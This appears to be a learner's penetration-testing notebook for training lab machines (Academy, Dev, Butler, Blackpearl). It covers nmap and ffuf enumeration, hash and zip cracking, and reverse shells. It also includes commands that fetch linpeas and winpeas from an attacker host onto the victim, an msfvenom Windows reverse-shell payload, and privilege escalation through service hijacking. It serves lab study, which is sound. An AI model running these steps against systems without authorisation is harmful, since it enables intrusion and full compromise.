# Academy
## Basic Enumeration
Get the ip address
Run nmap to get ports quickly
```bash
nmap -T4 -p- --min-rate=1000 --max-retries=3 ip-address
```
Run nmap to fingerprint the discovered ports and running services
```bash
nmap -T4 -A -p <ports> ip-address
```
Investigate the opened services. See the kind of access that we have. Review the versions
## Services
### FTP
FTP: try to connect to it. See if there are vulnerabilities associate with it or information to extract
```bash
ftp ip-to-connect
get file-to-download
```
Found a has? a tool called `hash-identifier` can be used to help identify the type
Crack MD5 hashes with hashcat
```bash
hashcat -m 0 hash-file /path/to/wordlist
```
### HTTP
HTTP: Run directory discovery scans. Generate error messages. Mapout the technologies used.
use ffuf non recursively to bruteforce directories
```bash
ffuf -u url/FUZZ -w /path/to/wordlist
```
If we get into the website, look for way to get code execution
Check for all the functionality
Try to upload a reverse shell that matches the technology in use
Find one using google "php reverse shell"
use `nc` to listen for the reverse shell
## Shell Access
Once we get access to the console, enumerate the user and see what access we have
for linux use linpeas
use linpeas from github to escalate privileges (very important that it is the official one from GitHub)
could use a python3 server to transfer the linpeas.sh file
Attacker machine
```bash
python3 -m http.server 80
```
Victim machine
```bash
wget http://ip-attacker/linpeas.sh
```
do this in a /tmp folder
make the file executable
run it a see what it discovers
You can also use pspy to list processes
Use that information to escalate privileges or change to another user
If we change to another user then repeat the same process with linpeas.sh
check for a process being run by the root that we can inject our own code into
if you found one the insert a bash reverse shell. use a one liner if possible
# Dev
Get the ip address
Run nmap to get ports quickly
Run nmap to fingerprint the discovered ports and running services
Investigate the opened services. See the kind of access that we have. Review the versions
## Services
### HTTP
HTTP: Run directory discovery scans. Generate error messages. Mapout the technologies used.
use ffuf non recursively to bruteforce directories
```bash
ffuf -u url/FUZZ -w /path/to/wordlist
```
Do something else while scans run in the background
Look at the pages returned by the scans
Look for technologies used and known vulnerabilities associated with them
### 2049/tcp nfs_acl
```bash
showmount ip-address
```
mount to the share
```bash
mkdir /mnt/dev
mount -t nfs ip-address:/path/to/nfs /mnt/dev
cd /mnt/dev
```
## file types
If a zip has a password we could use a tool to try to crack it
```bash
sudo apt install fcrackzip
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt ziptocrack.zip
```
## Shell Access
Once we get access to the console, enumerate the user and see what access we have
```bash
history
sudo -l
```
If `sudo -l` works then use the GTFOBins website to find a path to escalate privileges
use linpeas from github to escalate privileges (very important that it is the official one from GitHub)
# Butler
Same nmap workflow
Investigate the opened services. See the kind of access that we have. Review the versions
## Services
### Jenkins
Look for pentesting guides on jenkins
Look for CVEs
Try default credentials
Could bruteforce it with metasploit or burp suite
Find a way to get RCE
## Shell Access
Look for privilege escalations paths
Use winpeas for windows privilege escalation
could use a python3 server to transfer the winpeas.exe file
Attacker machine
```bash
python3 -m http.server 80
```
Victim machine
```cmd
certutil.exe -urlcache -f http://ip-attacker/winpeas.exe winpeas.exe
```
download the file in the 
c:\Users\user-here folder or the c:\Users\user-here\Downloads folder. Somewhere that the user has write permissions
run the file
Look for quick wins. This is for privilege escalation and for any stage of the pentest
Try to find something that the user can modify and that runs with administrator/root privileges
Use msfvenom to generate shell code
From attacker machine
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=port-number -f exe > Name.exe
```
Need to restart the running service so the new .exe executes
Find what service is running
winpeas should have this info
```cmd
sc stop ServiceName
sc query ServiceName
sc start ServiceName
```
# Blackpearl
Same nmap workflow
Investigate the opened services. See the kind of access that we have. Review the versions
## Services
### HTTP
View source code
Enumerate page via directory bruteforce tools `ffuf`
Fingerprint technologies used and try to find a CVE with RCE
Look for Rapid7 or exploit DB articles in google. metasploit might help get the RCE going
### DNS
```bash
dnsrecon -r 127.0.0.0/24 -n ip-address-of-victim -d blah
```
add entry to /etc/hosts
## Shell Access
if a non interactive shell is seen, try to generate a TTY Shell. Use google to find a way to do it
```bash
python -c 'import pty; pty.spawn("/bin/bash")'   # Spawns a basic TTY
```
Follow the linpeas.sh methodology
find suid files
manual command
```bash
find / -type f -perm 4000 2>/dev/nell
```
use https://gtfobins.github.io
